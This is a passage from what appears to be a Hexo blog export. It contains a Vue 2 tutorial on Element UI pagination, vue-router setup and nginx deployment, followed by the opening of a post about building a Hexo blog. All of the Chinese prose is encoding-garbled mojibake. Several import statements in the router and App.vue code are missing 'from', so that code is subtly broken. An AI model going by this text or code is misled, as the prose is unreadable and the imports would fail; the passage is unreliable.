<p><strong>PS:Elementç»„ä»¶çš„æ‰€æœ‰å±æ€§éƒ½å¯ä»¥åœ¨ç»„ä»¶é¡µé¢çš„æœ€ä¸‹æ–¹æ‰¾åˆ°</strong>ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2023-11-26/0f0b2aab93e8d8518b669d973dde38c1--6d6a--image-20231126131145410.png" alt="image-20231126131145410"></p>
<h4 id="3ã€åˆ†é¡µç»„ä»¶çš„ä½¿ç”¨"><a href="#3ã€åˆ†é¡µç»„ä»¶çš„ä½¿ç”¨" class="headerlink" title="3ã€åˆ†é¡µç»„ä»¶çš„ä½¿ç”¨"></a>3ã€åˆ†é¡µç»„ä»¶çš„ä½¿ç”¨</h4><h5 id="â‘ æ¨¡å—çš„ç®€å•ä½¿ç”¨ä»‹ç»"><a href="#â‘ æ¨¡å—çš„ç®€å•ä½¿ç”¨ä»‹ç»" class="headerlink" title="â‘ æ¨¡å—çš„ç®€å•ä½¿ç”¨ä»‹ç»"></a>â‘ æ¨¡å—çš„ç®€å•ä½¿ç”¨ä»‹ç»</h5><p>Pagination: åˆ†é¡µç»„ä»¶ï¼Œä¸»è¦æä¾›åˆ†é¡µå·¥å…·æ¡ç›¸å…³åŠŸèƒ½ã€‚å…¶å±•ç¤ºæ•ˆæœå›¾ä¸‹å›¾æ‰€ç¤ºï¼š</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2023-11-26/7468d1d99b01cb7723ca4c0cd4335452--94ad--image-20231126131705631.png" alt="image-20231126131705631"></p>
<p>é¦–å…ˆåœ¨å®˜ç½‘æ‰¾åˆ°åˆ†é¡µç»„ä»¶ï¼Œæˆ‘ä»¬é€‰æ‹©å¸¦èƒŒæ™¯è‰²åˆ†é¡µç»„ä»¶ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p>
<p>ç„¶åå¤åˆ¶ä»£ç åˆ°æˆ‘ä»¬çš„ElementView.vueç»„ä»¶æ–‡ä»¶çš„templateä¸­ï¼Œæ‹·è´å¦‚ä¸‹ä»£ç ï¼š</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">el-pagination</span></span></span><br><span class="line"><span class="tag">    <span class="attr">background</span></span></span><br><span class="line"><span class="tag">    <span class="attr">layout</span>=<span class="string">&quot;prev, pager, next&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">:total</span>=<span class="string">&quot;1000&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">el-pagination</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>å¯¹äºåˆ†é¡µç»„ä»¶æˆ‘ä»¬éœ€è¦å…³æ³¨çš„æ˜¯å¦‚ä¸‹å‡ ä¸ªé‡è¦å±æ€§ï¼ˆå¯ä»¥é€šè¿‡æŸ¥é˜…å®˜ç½‘ç»„ä»¶ä¸­æœ€ä¸‹é¢çš„ç»„ä»¶å±æ€§è¯¦ç»†è¯´æ˜å¾—åˆ°ï¼‰ï¼š</p>
<ul>
<li>background: æ·»åŠ åŒ—äº¬é¢œè‰²ï¼Œä¹Ÿå°±æ˜¯ä¸Šå›¾è“è‰²èƒŒæ™¯è‰²æ•ˆæœã€‚</li>
<li>layout: åˆ†é¡µå·¥å…·æ¡çš„å¸ƒå±€ï¼Œå…¶å…·ä½“å€¼åŒ…å«<code>sizes</code>, <code>prev</code>, <code>pager</code>, <code>next</code>, <code>jumper</code>, <code>-&gt;</code>, <code>total</code>, <code>slot</code> è¿™äº›å€¼</li>
<li>total: æ•°æ®çš„æ€»æ•°é‡</li>
</ul>
<p>ç„¶åæ ¹æ®å®˜æ–¹åˆ†é¡µç»„ä»¶æä¾›çš„layoutå±æ€§è¯´æ˜ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2023-11-26/e22f237cc331a65a0908fb17c9c2b5b6--af07--image-20231126132145510.png" alt="image-20231126132145510"></p>
<p>æˆ‘ä»¬å¯ä»¥è¿›è¡Œç›¸å…³çš„è‡ªå®šä¹‰</p>
<h5 id="â‘¡ç»„ä»¶äº‹ä»¶"><a href="#â‘¡ç»„ä»¶äº‹ä»¶" class="headerlink" title="â‘¡ç»„ä»¶äº‹ä»¶"></a>â‘¡ç»„ä»¶äº‹ä»¶</h5><p>å¯¹äºåˆ†é¡µç»„ä»¶ï¼Œé™¤äº†ä¸Šè¿°å‡ ä¸ªå±æ€§ï¼Œè¿˜æœ‰2ä¸ªéå¸¸é‡è¦çš„äº‹ä»¶æˆ‘ä»¬éœ€è¦å»å­¦ä¹ ï¼š</p>
<ul>
<li>size-change ï¼š pageSize æ”¹å˜æ—¶ä¼šè§¦å‘ </li>
<li>current-change ï¼šcurrentPage æ”¹å˜æ—¶ä¼šè§¦å‘</li>
</ul>
<p>å…¶å®˜æ–¹è¯¦ç»†è§£é‡Šå«ä¹‰å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2023-11-26/e827629131f4a621175ebf09cc745931--039d--image-20231126132222798.png" alt="image-20231126132222798"></p>
<p>ç„¶åæˆ‘ä»¬æ‰¾åˆ°å¯¹åº”çš„ä»£ç ï¼Œé¦–å…ˆå¤åˆ¶äº‹ä»¶ï¼Œå¤åˆ¶ä»£ç å¦‚ä¸‹ï¼š</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">@size-change=<span class="string">&quot;handleSizeChange&quot;</span></span><br><span class="line">@current-change=<span class="string">&quot;handleCurrentChange&quot;</span></span><br></pre></td></tr></table></figure>

<p>æ­¤æ—¶Panigationç»„ä»¶çš„templateå®Œæ•´ä»£ç å¦‚ä¸‹ï¼š</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- Paginationåˆ†é¡µ --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">el-pagination</span></span></span><br><span class="line"><span class="tag">               @<span class="attr">size-change</span>=<span class="string">&quot;handleSizeChange&quot;</span></span></span><br><span class="line"><span class="tag">               @<span class="attr">current-change</span>=<span class="string">&quot;handleCurrentChange&quot;</span></span></span><br><span class="line"><span class="tag">               <span class="attr">background</span></span></span><br><span class="line"><span class="tag">               <span class="attr">layout</span>=<span class="string">&quot;sizes,prev, pager, next,jumper,total&quot;</span></span></span><br><span class="line"><span class="tag">               <span class="attr">:total</span>=<span class="string">&quot;1000&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">el-pagination</span>&gt;</span></span><br></pre></td></tr></table></figure>



<p>ç´§æ¥ç€éœ€è¦å¤åˆ¶äº‹ä»¶éœ€è¦çš„2ä¸ªå‡½æ•°ï¼Œéœ€è¦æ³¨æ„methodså±æ€§å’ŒdataåŒçº§ï¼Œå…¶ä»£ç å¦‚ä¸‹ï¼š</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">methods<span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      handleSizeChange(val) <span class="punctuation">&#123;</span></span><br><span class="line">        console.log(`æ¯é¡µ $<span class="punctuation">&#123;</span>val<span class="punctuation">&#125;</span> æ¡`);</span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      handleCurrentChange(val) <span class="punctuation">&#123;</span></span><br><span class="line">        console.log(`å½“å‰é¡µ<span class="punctuation">:</span> $<span class="punctuation">&#123;</span>val<span class="punctuation">&#125;</span>`);</span><br><span class="line">      <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br></pre></td></tr></table></figure>

<p>æ­¤æ—¶Panigationç»„ä»¶çš„scriptéƒ¨åˆ†å®Œæ•´ä»£ç å¦‚ä¸‹ï¼š</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">methods</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="title function_">handleSizeChange</span>(<span class="params">val</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`æ¯é¡µ <span class="subst">$&#123;val&#125;</span> æ¡`</span>);</span></span><br><span class="line"><span class="language-javascript">      &#125;,</span></span><br><span class="line"><span class="language-javascript">      <span class="title function_">handleCurrentChange</span>(<span class="params">val</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`å½“å‰é¡µ: <span class="subst">$&#123;val&#125;</span>`</span>);</span></span><br><span class="line"><span class="language-javascript">      &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;,</span></span><br><span class="line"><span class="language-javascript">     <span class="title function_">data</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="language-javascript">          <span class="attr">tableData</span>: [&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">date</span>: <span class="string">&#x27;2016-05-02&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">name</span>: <span class="string">&#x27;ç‹å°è™&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">address</span>: <span class="string">&#x27;ä¸Šæµ·å¸‚æ™®é™€åŒºé‡‘æ²™æ±Ÿè·¯ 1518 å¼„&#x27;</span></span></span><br><span class="line"><span class="language-javascript">          &#125;, &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">date</span>: <span class="string">&#x27;2016-05-04&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">name</span>: <span class="string">&#x27;ç‹å°è™&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">address</span>: <span class="string">&#x27;ä¸Šæµ·å¸‚æ™®é™€åŒºé‡‘æ²™æ±Ÿè·¯ 1517 å¼„&#x27;</span></span></span><br><span class="line"><span class="language-javascript">          &#125;, &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">date</span>: <span class="string">&#x27;2016-05-01&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">name</span>: <span class="string">&#x27;ç‹å°è™&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">address</span>: <span class="string">&#x27;ä¸Šæµ·å¸‚æ™®é™€åŒºé‡‘æ²™æ±Ÿè·¯ 1519 å¼„&#x27;</span></span></span><br><span class="line"><span class="language-javascript">          &#125;, &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">date</span>: <span class="string">&#x27;2016-05-03&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">name</span>: <span class="string">&#x27;ç‹å°è™&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">address</span>: <span class="string">&#x27;ä¸Šæµ·å¸‚æ™®é™€åŒºé‡‘æ²™æ±Ÿè·¯ 1516 å¼„&#x27;</span></span></span><br><span class="line"><span class="language-javascript">          &#125;]</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">      &#125;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>Elementåº“ä¸­è¿˜æœ‰è®¸å¤šå„ç§å„æ ·çš„æ¨¡å—ï¼Œå°±ä¸è¿‡å¤šå»æ‘˜æŠ„äº†ï¼Œä¹Ÿéƒ½å¯ä»¥å»å®˜æ–¹ç½‘ç«™å»å¤åˆ¶ç²˜è´´ä½¿ç”¨ã€‚</p>
<h3 id="5ã€Vueè·¯ç”±"><a href="#5ã€Vueè·¯ç”±" class="headerlink" title="5ã€Vueè·¯ç”±"></a>5ã€Vueè·¯ç”±</h3><p>é¦–å…ˆæˆ‘ä»¬éœ€è¦å…ˆå®‰è£…vue-routeræ’ä»¶ï¼Œå¯ä»¥é€šè¿‡å¦‚ä¸‹å‘½ä»¤</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install vue-router@3.5.1</span><br></pre></td></tr></table></figure>

<p><strong>ä½†æ˜¯æˆ‘ä»¬ä¸éœ€è¦å®‰è£…ï¼Œå› ä¸ºå½“åˆæˆ‘ä»¬å†åˆ›å»ºé¡¹ç›®æ—¶ï¼Œå·²ç»å‹¾é€‰äº†è·¯ç”±åŠŸèƒ½ï¼Œå·²ç»å®‰è£…å¥½äº†ã€‚</strong></p>
<p>ç„¶åæˆ‘ä»¬éœ€è¦åœ¨<strong>src&#x2F;router&#x2F;index.js</strong>æ–‡ä»¶ä¸­å®šä¹‰è·¯ç”±è¡¨ï¼Œæ ¹æ®å…¶æä¾›çš„æ¨¡æ¿ä»£ç è¿›è¡Œä¿®æ”¹ï¼Œæœ€ç»ˆä»£ç å¦‚ä¸‹ï¼š</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">Vue</span>  <span class="string">&#x27;vue&#x27;</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">VueRouter</span>  <span class="string">&#x27;vue-router&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">Vue</span>.<span class="title function_">use</span>(<span class="title class_">VueRouter</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> routes = [</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="attr">path</span>: <span class="string">&#x27;/emp&#x27;</span>,  <span class="comment">//åœ°å€hash</span></span><br><span class="line">    <span class="attr">name</span>: <span class="string">&#x27;emp&#x27;</span>,</span><br><span class="line">    <span class="attr">component</span>:  <span class="function">() =&gt;</span> <span class="keyword">import</span>(<span class="string">&#x27;../views/tlias/EmpView.vue&#x27;</span>)  <span class="comment">//å¯¹åº”çš„vueç»„ä»¶</span></span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="attr">path</span>: <span class="string">&#x27;/dept&#x27;</span>,</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&#x27;dept&#x27;</span>,</span><br><span class="line">    <span class="attr">component</span>: <span class="function">() =&gt;</span> <span class="keyword">import</span>(<span class="string">&#x27;../views/tlias/DeptView.vue&#x27;</span>)</span><br><span class="line">  &#125;</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> router = <span class="keyword">new</span> <span class="title class_">VueRouter</span>(&#123;</span><br><span class="line">  routes</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> router</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>æ³¨æ„éœ€è¦å»æ‰æ²¡æœ‰å¼•ç”¨çš„importæ¨¡å—ã€‚</p>
<p>åœ¨main.jsä¸­ï¼Œæˆ‘ä»¬å·²ç»å¼•å…¥äº†routeråŠŸèƒ½ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2023-11-26/f9cd77e8eaaf0da83921d624361fed4c--012d--image-20231126140930945.png" alt="image-20231126140930945"></p>
<p>è·¯ç”±åŸºæœ¬ä¿¡æ¯é…ç½®å¥½äº†ï¼Œè·¯ç”±è¡¨å·²ç»è¢«åŠ è½½ï¼Œæ­¤æ—¶æˆ‘ä»¬è¿˜ç¼ºå°‘2ä¸ªä¸œè¥¿ï¼Œå°±æ˜¯&lt;router-lin&gt;å’Œ&lt;router-view&gt;,æ‰€ä»¥æˆ‘ä»¬éœ€è¦ä¿®æ”¹2ä¸ªé¡µé¢ï¼ˆEmpView.vueå’ŒDeptView.vueï¼‰æˆ‘ä»¬å·¦ä¾§æ çš„2ä¸ªæŒ‰é’®ä¸ºrouter-link,å…¶ä»£ç å¦‚ä¸‹ï¼š</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">el-menu-item</span> <span class="attr">index</span>=<span class="string">&quot;1-1&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">router-link</span> <span class="attr">to</span>=<span class="string">&quot;/dept&quot;</span>&gt;</span>éƒ¨é—¨ç®¡ç†<span class="tag">&lt;/<span class="name">router-link</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">el-menu-item</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">el-menu-item</span> <span class="attr">index</span>=<span class="string">&quot;1-2&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">router-link</span> <span class="attr">to</span>=<span class="string">&quot;/emp&quot;</span>&gt;</span>å‘˜å·¥ç®¡ç†<span class="tag">&lt;/<span class="name">router-link</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">el-menu-item</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>ç„¶åæˆ‘ä»¬è¿˜éœ€è¦åœ¨å†…å®¹å±•ç¤ºåŒºåŸŸå³App.vueä¸­å®šä¹‰route-viewï¼Œä½œä¸ºç»„ä»¶çš„åˆ‡æ¢ï¼Œå…¶App.vueçš„å®Œæ•´ä»£ç å¦‚ä¸‹ï¼š</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- &#123;&#123;message&#125;&#125; --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- &lt;element-view&gt;&lt;/element-view&gt; --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- &lt;emp-view&gt;&lt;/emp-view&gt; --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">router-view</span>&gt;</span><span class="tag">&lt;/<span class="name">router-view</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// import EmpView  &#x27;./views/tlias/EmpView.vue&#x27;</span></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// import ElementView  &#x27;./views/Element/ElementView.vue&#x27;</span></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="language-javascript">  <span class="attr">components</span>: &#123; &#125;,</span></span><br><span class="line"><span class="language-javascript">  <span class="title function_">data</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="string">&quot;message&quot;</span>:<span class="string">&quot;hello world&quot;</span></span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>ä½†æ˜¯æˆ‘ä»¬æµè§ˆå™¨æ‰“å¼€åœ°å€ï¼š <a href="http://localhost:7000/">http://localhost:7000/</a> ï¼Œå‘ç°ä¸€ç‰‡ç©ºç™½ï¼Œå› ä¸ºæˆ‘ä»¬é»˜è®¤çš„è·¯ç”±è·¯å¾„æ˜¯&#x2F;,ä½†æ˜¯è·¯ç”±é…ç½®ä¸­æ²¡æœ‰å¯¹åº”çš„å…³ç³»ï¼Œ</p>
<p>æ‰€ä»¥æˆ‘ä»¬éœ€è¦åœ¨è·¯ç”±é…ç½®ä¸­&#x2F;å¯¹åº”çš„è·¯ç”±ç»„ä»¶ï¼Œä»£ç å¦‚ä¸‹ï¼š</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> routes = [</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="attr">path</span>: <span class="string">&#x27;/emp&#x27;</span>,</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&#x27;emp&#x27;</span>,</span><br><span class="line">    <span class="attr">component</span>:  <span class="function">() =&gt;</span> <span class="keyword">import</span>(<span class="string">&#x27;../views/tlias/EmpView.vue&#x27;</span>)</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="attr">path</span>: <span class="string">&#x27;/dept&#x27;</span>,</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&#x27;dept&#x27;</span>,</span><br><span class="line">    <span class="attr">component</span>: <span class="function">() =&gt;</span> <span class="keyword">import</span>(<span class="string">&#x27;../views/tlias/DeptView.vue&#x27;</span>)</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="attr">path</span>: <span class="string">&#x27;/&#x27;</span>,</span><br><span class="line">    <span class="attr">redirect</span>:<span class="string">&#x27;/emp&#x27;</span> <span class="comment">//è¡¨ç¤ºé‡å®šå‘åˆ°/empå³å¯</span></span><br><span class="line">  &#125;,</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<p>æ­¤æ—¶æˆ‘ä»¬æ‰“å¼€æµè§ˆå™¨ï¼Œè®¿é—®<a href="http://localhost:7000/">http://localhost:7000</a> å‘ç°ç›´æ¥è®¿é—®çš„æ˜¯empçš„é¡µé¢ï¼Œå¹¶ä¸”èƒ½å¤Ÿè¿›è¡Œåˆ‡æ¢äº†ã€‚</p>
<h3 id="6ã€é¡¹ç›®éƒ¨ç½²æ‰“åŒ…"><a href="#6ã€é¡¹ç›®éƒ¨ç½²æ‰“åŒ…" class="headerlink" title="6ã€é¡¹ç›®éƒ¨ç½²æ‰“åŒ…"></a>6ã€é¡¹ç›®éƒ¨ç½²æ‰“åŒ…</h3><p>å‰ç«¯æ‰“åŒ…ç›´æ¥ä½¿ç”¨npmè„šæœ¬ä¸­çš„buildå°±è¡Œã€</p>
<p>ç„¶åä¼šåœ¨å·¥ç¨‹ç›®å½•ä¸‹ç”Ÿæˆä¸€ä¸ªdistç›®å½•ï¼Œç”¨äºå­˜æ”¾éœ€è¦å‘å¸ƒçš„å‰ç«¯èµ„æº</p>
<p>ç„¶åå°±æ˜¯é¡¹ç›®çš„éƒ¨ç½²</p>
<p>å°†æˆ‘ä»¬ä¹‹å‰æ‰“åŒ…çš„å‰ç«¯å·¥ç¨‹distç›®å½•ä¸‹å¾—å†…å®¹æ‹·è´åˆ°nginxçš„htmlç›®å½•ä¸‹</p>
<p>ç„¶åå¯åŠ¨nginxå»å¯åŠ¨æœåŠ¡ï¼Œå°±æˆåŠŸå°†è¯¥é¡¹ç›®éƒ¨ç½²å®Œæˆäº†</p>
<hr>
<p>åˆ°è¿™å°±å·®ä¸å¤šäº†è¿™ç¯‡ï¼Œä¸»è¦å°±æ˜¯å¯¹javaä¸­ä¸€äº›ç®€å•çš„å‰ç«¯çŸ¥è¯†è¿›è¡Œæ€»ç»“ã€‚</p>
]]></content>
      <categories>
        <category>å‰ç«¯</category>
      </categories>
      <tags>
        <tag>html</tag>
        <tag>css</tag>
        <tag>js</tag>
      </tags>
  </entry>
  <entry>
    <title>å…³äºåšå®¢æ­å»ºçš„ä¸€äº›è‡ªæˆ‘å¿ƒå¾—</title>
    <url>/2023/11/09/%E5%85%B3%E4%BA%8E%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E7%9A%84%E4%B8%80%E4%BA%9B%E8%87%AA%E6%88%91%E5%BF%83%E5%BE%97/</url>
    <content><![CDATA[<p>é¦–å…ˆï¼Œè¿™ç¯‡åšå®¢å¹¶ä¸ä¼šè¯¦ç»†è®²è§£æ­åšå®¢çš„è¿‡ç¨‹ä»€ä¹ˆçš„ï¼Œåªæ˜¯ç¨å¾®åˆ†äº«ä¸€ä¸‹æˆ‘è‡ªå·±æ­åšå®¢æ—¶é‡åˆ°çš„ä¸€äº›é—®é¢˜å’Œå­¦åˆ°çš„ä¸€äº›ä¸œè¥¿ã€‚</p>
<span id="more"></span>

<h1 id="ä¸€ã€åšå®¢æ­å»ºä¸»ä½“çš„é€‰æ‹©"><a href="#ä¸€ã€åšå®¢æ­å»ºä¸»ä½“çš„é€‰æ‹©" class="headerlink" title="ä¸€ã€åšå®¢æ­å»ºä¸»ä½“çš„é€‰æ‹©"></a>ä¸€ã€åšå®¢æ­å»ºä¸»ä½“çš„é€‰æ‹©</h1><p>æˆ‘æ„Ÿè§‰ç°åœ¨å¤§éƒ¨åˆ†ä¸»æµçš„ä½¿ç”¨çš„åšå®¢ä¸»ä½“å°±æ˜¯ä¸¤ç§ï¼Œ(å½“ç„¶ä¸»è¦ä¹Ÿæ˜¯æˆ‘æ¥è§¦åˆ°çš„åšå®¢çœ‹å¥½åƒéƒ½æ˜¯è¿™ä¸¤ç§),åˆ†åˆ«å°±æ˜¯hexoå’ŒWordPressï¼Œä¸è¿‡ç”±äºæˆ‘ç°åœ¨è¿˜æ˜¯å›Šä¸­ç¾æ¶©ï¼Œæ‰€ä»¥å°±å»ä½¿ç”¨äº†å…è´¹çš„github+hexoå»æ­å»ºï¼Œè€Œå¯¹äºWordPressè€Œè¨€ï¼Œæ­å»ºåˆ™éœ€è¦æœ‰ä¸€ä¸ªæœåŠ¡å™¨æ‰èƒ½å»å®Œæˆã€‚</p>
<h1 id="äºŒã€æ­å»ºåšå®¢æ—¶é‡åˆ°çš„ä¸€äº›é—®é¢˜"><a href="#äºŒã€æ­å»ºåšå®¢æ—¶é‡åˆ°çš„ä¸€äº›é—®é¢˜" class="headerlink" title="äºŒã€æ­å»ºåšå®¢æ—¶é‡åˆ°çš„ä¸€äº›é—®é¢˜"></a>äºŒã€æ­å»ºåšå®¢æ—¶é‡åˆ°çš„ä¸€äº›é—®é¢˜</h1><p>åšå®¢çš„æ™®é€šæ­å»ºè¿˜æ˜¯éå¸¸ç®€å•çš„ï¼ŒåŸºæœ¬å°±æ˜¯æŒ‰ç…§ç½‘ä¸Šçš„æ•™ç¨‹æ¥å°±ä¸ä¼šæœ‰ä»€ä¹ˆé—®é¢˜çš„ï¼Œä¸»è¦å°±æ˜¯ä¸»é¢˜çš„é…ç½®ï¼Œè¿™æ‰æ˜¯æœ€éš¾çš„ã€‚æœ¬æ¥æˆ‘æ˜¯æƒ³ç€ï¼Œä¸»é¢˜è¿™è‚¯å®šå°±æ˜¯è¦é€‰ä¸ªç‰¹åˆ«å¥½çœ‹çš„å•Šï¼Œè¿™æ ·æ‰ç‚«ï¼Œæ‰€ä»¥å°±é€‰æ‹©äº†ParticleXè¿™ä¸ªä¸»é¢˜ï¼Œé…ç½®å®Œäº†å‘ç°çš„ç¡®å¾ˆç‚«å•Šï¼Œç„¶åè¿‡äº†ä¸€æ®µæ—¶é—´ï¼Œæˆ‘æ‰“ç®—å§åˆ†ç±»ã€æ ‡ç­¾ä»€ä¹ˆçš„å»å¼„å¥½çš„æ—¶å€™ï¼Œå°±å‘ç°ä¹Ÿä¸çŸ¥é“ä¸ºä»€ä¹ˆè¯†åˆ«ä¸å‡ºæ¥åˆ›å»ºé¡µé¢çš„ç±»å‹ï¼Œè¯•äº†å¥½å¤šæ–¹æ³•éƒ½ä¸è¡Œï¼Œå°±é‡æ–°æ­äº†ï¼Œç„¶åå°±æ›´æƒ¨äº†ï¼Œå‘ç°é“¾ä»£ç å—éƒ½è¯†åˆ«é”™è¯¯äº†ï¼Œå®Œå…¨æ²¡å‘ç”¨ï¼Œåˆè¯•äº†å¥½å‡ æ¬¡ï¼Œå‘ç°éƒ½ä¸è¡Œï¼Œåªèƒ½æ¢æˆæœ€é€šç”¨çš„nextä¸»é¢˜äº†ï¼ŒğŸ˜­ï¼Œä¸è¿‡nextä¸»é¢˜å…¶å®ä¹Ÿè¿˜ä¸é”™ï¼Œç¨³å®šè€Œä¸”åŠŸèƒ½ä»€ä¹ˆçš„å¼€å‘çš„éƒ½å¾ˆå…¨ï¼Œç½‘ä¸Šæ•™ç¨‹å¾ˆå…¨ï¼Œåˆè´¹äº†ä¸€æ®µæ—¶é—´ä¹Ÿç®—æˆåŠŸæ­å¥½äº†ã€‚</p>
